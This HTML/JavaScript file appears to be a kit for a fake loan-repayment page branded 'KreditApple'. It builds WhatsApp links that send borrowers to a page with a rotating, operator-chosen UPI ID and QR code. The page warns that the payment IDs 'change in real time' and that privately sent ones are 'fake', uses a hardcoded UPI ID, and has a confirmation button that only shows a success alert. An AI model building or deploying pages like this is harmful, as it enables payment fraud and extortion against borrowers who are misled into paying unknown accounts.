<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Order Details - KreditApple</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen m-0">

<div class="w-full max-w-md bg-white shadow-xl min-h-screen flex flex-col justify-between pb-6" id="app">
  <!-- Default Loading State -->
  <div class="p-6 text-center text-gray-500 font-medium">Loading KreditApple...</div>
</div>

<script>
function getData(){
  try {
    const p = new URLSearchParams(window.location.search);
    const c = p.get('c');
    if(c){
      return JSON.parse(atob(c));
    }
    if(p.get('biz')){
      return {
        biz: p.get('biz') || 'KreditApple',
        name: p.get('name') || 'Customer',
        days: p.get('days') || '0',
        ext: p.get('ext') || '2400',
        full: p.get('full') || '6000',
        upi1: p.get('upi1') || 'bharatpe.90065511470@fbpe',
        upi2: p.get('upi2') || '',
        upi3: p.get('upi3') || '',
        upi4: p.get('upi4') || '',
        upi5: p.get('upi5') || ''
      };
    }
  } catch(e) {
    console.error(e);
  }
  return null;
}

const d = getData();
const app = document.getElementById('app');
const urlParams = new URLSearchParams(window.location.search);
let sel = parseInt(urlParams.get('ch') || '1');
let page = urlParams.get('page') || 'home';
let mode = urlParams.get('mode') || 'repay';
let partAmt = 5000;

function getUpis(){
  if(!d) return ['', '', '', '', ''];
  return [d.upi1||'', d.upi2||'', d.upi3||'', d.upi4||'', d.upi5||''];
}

function goPay(m){
  const u = new URL(window.location.href);
  u.searchParams.set('page', 'pay');
  u.searchParams.set('mode', m);
  u.searchParams.set('ch', sel);
  window.location.href = u.toString();
}

function goHome(){
  const u = new URL(window.location.href);
  u.searchParams.delete('page');
  u.searchParams.delete('mode');
  window.location.href = u.toString();
}

function renderApp(){
  if(!d){
    app.innerHTML = `
      <div class="bg-[#2196F3] text-white px-4 py-4 text-center font-bold text-base shadow">KreditApple - Link Generator</div>
      <div class="p-4 space-y-3 overflow-y-auto">
        <label class="text-xs font-bold block text-gray-700">Business Name</label>
        <input id="biz" value="KreditApple" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Customer Name</label>
        <input id="name" placeholder="Ahmed Khan" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Customer Mobile (WhatsApp)</label>
        <input id="mobile" placeholder="91750000058" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Waiting Text / Days Left</label>
        <input id="days" value="Waiting for reapy" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <div class="grid grid-cols-2 gap-2">
          <div>
            <label class="text-xs font-bold block text-gray-700">Extension Amount (₹)</label>
            <input id="ext" type="number" value="2400" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
          </div>
          <div>
            <label class="text-xs font-bold block text-gray-700">Full Repayment (₹)</label>
            <input id="full" type="number" value="6000" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
          </div>
        </div>

        <label class="text-xs font-bold block text-gray-700">Channel 1 UPI (Required)</label>
        <input id="upi1" value="bharatpe.90065511470@fbpe" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Channel 2 UPI (Optional)</label>
        <input id="upi2" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Channel 3 UPI (Optional)</label>
        <input id="upi3" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Channel 4 UPI (Optional)</label>
        <input id="upi4" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <label class="text-xs font-bold block text-gray-700">Channel 5 UPI (Optional)</label>
        <input id="upi5" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50 focus:outline-blue-500">
        
        <button onclick="makeLink()" class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold mt-3 shadow hover:bg-[#006e94]">Generate Customer Link</button>
        <div id="out"></div>
      </div>`;
    return;
  }

  const list = getUpis();
  const avail = list.map((u, i) => u ? i + 1 : null).filter(x => x !== null);
  if(!avail.includes(sel)) sel = avail[0] || 1;

  if(page !== 'pay'){
    let channelsHtml = '';
    for(let i = 1; i <= 5; i++){
      let isActive = (sel === i);
      let hasUpi = list[i-1] ? true : false;
      let bgClass = isActive ? 'bg-[#3498db] text-white shadow-sm' : (hasUpi ? 'bg-gray-200 text-gray-700' : 'bg-gray-200 text-gray-400');
      channelsHtml += `<button onclick="sel=${i};renderApp()" class="${bgClass} font-semibold py-3 rounded-xl text-xs transition">Channel ${i}</button>`;
    }

    app.innerHTML = `
      <div class="flex flex-col min-h-screen justify-between">
        <div>
          <div class="bg-[#2196F3] text-white px-4 py-3 flex justify-between items-center text-sm font-medium">
            <span>Order Details</span>
            <a href="#" class="hover:underline">Go borrow money >></a>
          </div>

          <div class="p-4 space-y-4">
            <div class="flex items-center justify-between border-b pb-3">
              <div class="flex items-center space-x-3">
                <div class="bg-[#1e3d30] p-2 rounded-xl text-white font-bold flex flex-col items-center justify-center w-12 h-12">
                  <span class="text-xl">K</span>
                  <span class="text-[8px]">${d.biz}</span>
                </div>
                <div>
                  <h2 class="font-bold text-gray-800 text-sm">${d.biz}-</h2>
                  <p class="text-xs text-gray-600">${d.biz}</p>
                </div>
              </div>
              <span class="font-bold text-gray-900 text-sm">${isNaN(d.days) ? d.days : d.days + ' Days left'}</span>
            </div>

            <div class="text-xs space-y-2 border-b pb-3">
              <div class="flex justify-between text-gray-400">
                <span>Account</span>
                <span class="text-gray-800 font-medium">+91 750****058</span>
              </div>
              <div class="flex justify-between text-gray-400">
                <span>Amount You Repay</span>
                <span class="text-gray-900 font-bold text-sm">₹${Number(d.full).toLocaleString('en-IN')}</span>
              </div>
              <div class="flex justify-between text-gray-400">
                <span>Repayment Date</span>
                <span class="text-gray-900 font-medium">2026-11-20</span>
              </div>
            </div>

            <div class="text-[11px] text-red-600 font-bold leading-tight bg-red-50 p-2 rounded border border-red-100">
              !!!Do <span class="text-red-700 underline">NOT</span> save UPI, UPI will change in real time!!!<br>
              !!!The UPI sent to you privately is <span class="text-red-700">FAKE</span> and will NOT be updated!!!
            </div>

            <div class="grid grid-cols-2 gap-3">
              <button onclick="goPay('repay')" class="bg-[#0083b0] text-white py-3 px-2 rounded-full font-bold text-sm shadow hover:bg-[#006e94] transition text-center">
                Repay ₹${Number(d.full).toLocaleString('en-IN')}
              </button>
              <button onclick="goPay('extension')" class="bg-[#26c6da] text-white py-3 px-2 rounded-full font-bold text-sm shadow hover:bg-[#22b2c4] transition text-center leading-tight flex flex-col justify-center">
                <span>7 days extension</span>
                <span class="text-xs">₹${Number(d.ext).toLocaleString('en-IN')}</span>
              </button>
            </div>

            <div class="space-y-2 pt-1">
              <label class="text-xs font-semibold text-gray-800">Part Repayment/₹</label>
              <div class="flex items-center justify-between border rounded-full px-4 py-2 bg-white shadow-sm">
                <button onclick="decreasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 flex items-center justify-center font-bold text-lg hover:bg-blue-50">-</button>
                <span id="partAmount" class="font-semibold text-gray-700 text-sm">${partAmt}</span>
                <button onclick="increasePart()" class="w-7 h-7 rounded-full border border-blue-400 text-blue-500 flex items-center justify-center font-bold text-lg hover:bg-blue-50">+</button>
              </div>
              <button onclick="goPay('repay')" class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold text-sm shadow hover:bg-[#006e94] transition">
                Repay ₹<span id="btnPartText">${partAmt}</span>
              </button>
              <p class="text-[11px] text-red-500 font-medium text-center">Repayment amount must match entered amount to be credited.</p>
            </div>

            <div class="space-y-2 pt-2">
              <label class="text-xs font-semibold text-gray-800">Repayment Channel</label>
              <div class="grid grid-cols-3 gap-2">
                ${channelsHtml}
              </div>
            </div>

            <div class="space-y-3 pt-2">
              <label class="text-xs font-semibold text-gray-800">Aready Paid?</label>
              <div class="space-y-2 text-xs">
                <div class="flex items-center border-b pb-2">
                  <span class="w-24 text-gray-600">Amount</span>
                  <input type="text" id="confAmount" placeholder="Input Amount" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
                </div>
                <div class="flex items-center border-b pb-2">
                  <span class="w-24 text-gray-600">UTR</span>
                  <input type="text" id="confUtr" placeholder="Input UTR" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
                </div>
                <div class="flex items-center border-b pb-2">
                  <span class="w-24 text-gray-600">UPI</span>
                  <input type="text" id="confUpi" placeholder="Input UPI(optional)" class="w-full focus:outline-none text-gray-700 placeholder-gray-300">
                </div>
                <div class="flex items-center justify-between pt-1">
                  <span class="text-gray-600">Screenshot</span>
                  <div class="w-16 h-16 border-2 border-dashed border-gray-200 rounded-lg flex items-center justify-center bg-gray-50 cursor-pointer relative overflow-hidden">
                    <input type="file" accept="image/*" class="absolute inset-0 opacity-0 cursor-pointer" onchange="previewImg(this)">
                    <svg id="camIcon" class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                    <span id="imgUploaded" class="text-[10px] text-green-600 font-bold hidden">Added</span>
                  </div>
                </div>
              </div>
              <button onclick="submitConfirm()" class="w-full bg-[#90caf9] text-white py-3 rounded-full font-bold text-sm shadow-sm mt-4 hover:bg-blue-400 transition">
                Confirm
              </button>
            </div>
          </div>
        </div>

        <div class="px-4 mt-6">
          <div class="bg-gradient-to-r from-[#ff7043] to-[#f4511e] rounded-2xl p-3 flex items-center justify-between text-white shadow-md">
            <div class="flex items-center space-x-2">
              <div class="bg-[#1e3d30] p-1.5 rounded-lg text-white font-bold flex flex-col items-center justify-center w-10 h-10">
                <span class="text-sm">K</span>
              </div>
              <div>
                <h4 class="font-extrabold text-sm leading-tight">Easy Loans</h4>
                <p class="text-[10px] bg-white/20 px-1.5 py-0.5 rounded inline-block mt-0.5">Just a Download Away</p>
              </div>
            </div>
            <button class="bg-[#ffe082] text-orange-900 font-extrabold px-5 py-2 rounded-full shadow hover:bg-amber-200 transition text-sm">
              GO
            </button>
          </div>
        </div>
      </div>
    `;
  } else {
    const isRepay = (mode === 'repay');
    const amt = isRepay ? d.full : d.ext;
    const upi = list[sel-1] || d.upi1;
    const title = isRepay ? 'Full Repayment' : 'Extension Payment';
    const upiLink = `upi://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(d.biz)}&am=${amt}&cu=INR&tn=${encodeURIComponent(title+' '+d.name)}`;
    const qr = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;

    app.innerHTML = `
      <div class="p-4 space-y-4">
        <div class="bg-[#2563eb] text-white rounded-2xl p-5 text-center shadow">
          <h2 class="text-xl font-black">${d.biz} - Payment</h2>
          <p class="text-xs opacity-90 mt-1">Scan QR ya UPI ID se Pay Karo</p>
        </div>
        
        <div class="text-center font-bold text-sm text-gray-800">${title} - ₹ ${Number(amt).toLocaleString('en-IN')} | Channel ${sel}</div>
        
        <div class="bg-white border rounded-2xl p-4 text-center shadow-sm">
          <img src="${qr}" class="w-52 h-52 mx-auto">
        </div>

        <a href="${upiLink}" class="block"><button class="w-full bg-[#16a34a] text-white py-4 rounded-xl font-bold text-base shadow">Pay Now - Direct Pay Karo</button></a>
        
        <div class="grid grid-cols-3 gap-2">
          <a href="${upiLink}" class="bg-white border-2 border-blue-600 text-blue-600 text-center py-3 rounded-xl font-bold text-sm">G Pay</a>
          <a href="${upiLink}" class="bg-[#5f259f] text-white text-center py-3 rounded-xl font-bold text-sm">PhonePe</a>
          <a href="${upiLink}" class="bg-[#00b9f1] text-white text-center py-3 rounded-xl font-bold text-sm">Paytm</a>
        </div>

        <div class="bg-[#eef2ff] p-3 rounded-xl text-center">
          <span class="text-xs text-gray-500 font-bold">UPI ID</span>
          <div class="font-bold text-sm text-blue-900 break-all mt-0.5">${upi}</div>
        </div>

        <button onclick="navigator.clipboard.writeText('${upi}');alert('UPI ID Copy ho gayi')" class="w-full bg-white border-2 border-blue-900 text-blue-900 py-3 rounded-full font-bold text-sm">Copy UPI ID</button>
        
        <button onclick="goHome()" class="w-full bg-gray-200 text-gray-700 py-3 rounded-full font-bold text-sm mt-2">Back to Details</button>
      </div>
    `;
  }
}

function increasePart(){
  partAmt += 500;
  document.getElementById('partAmount').innerText = partAmt;
  document.getElementById('btnPartText').innerText = partAmt;
}
function decreasePart(){
  if(partAmt > 500){
    partAmt -= 500;
    document.getElementById('partAmount').innerText = partAmt;
    document.getElementById('btnPartText').innerText = partAmt;
  }
}
function previewImg(input){
  if(input.files && input.files[0]){
    document.getElementById('camIcon').style.display = 'none';
    document.getElementById('imgUploaded').style.display = 'block';
  }
}
function submitConfirm(){
  const utr = document.getElementById('confUtr').value;
  if(!utr){
    alert('Please enter UTR / Transaction ID');
  } else {
    alert('Payment confirmation submitted successfully!');
  }
}

function makeLink(){
  const data = {
    biz: document.getElementById('biz').value || 'KreditApple',
    name: document.getElementById('name').value || 'Customer',
    mobile: document.getElementById('mobile').value || '',
    days: document.getElementById('days').value || '0',
    ext: document.getElementById('ext').value || '2400',
    full: document.getElementById('full').value || '6000',
    upi1: document.getElementById('upi1').value,
    upi2: document.getElementById('upi2').value,
    upi3: document.getElementById('upi3').value,
    upi4: document.getElementById('upi4').value,
    upi5: document.getElementById('upi5').value
  };
  if(!data.upi1){ alert('Channel 1 UPI is required'); return; }
  const code = btoa(JSON.stringify(data));
  const link = window.location.origin + window.location.pathname + '?c=' + code;
  const msg = `Hello ${data.name}, your ${data.biz} repayment link: ${link}`;
  
  document.getElementById('out').innerHTML = `
    <div class="bg-orange-50 border border-orange-200 p-3 rounded-lg mt-3 break-all text-xs text-gray-700">${link}</div>
    <button class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold mt-2 shadow" onclick="navigator.clipboard.writeText('${link}');alert('Link Copied!')">Copy Link</button>
    <a href="https://wa.me/${data.mobile}?text=${encodeURIComponent(msg)}" target="_blank" class="block text-center bg-[#25D366] text-white py-3 rounded-full font-bold mt-2 shadow">Send on WhatsApp</a>
  `;
}

// Run render on load
renderApp();
</script>
</body>
</html>
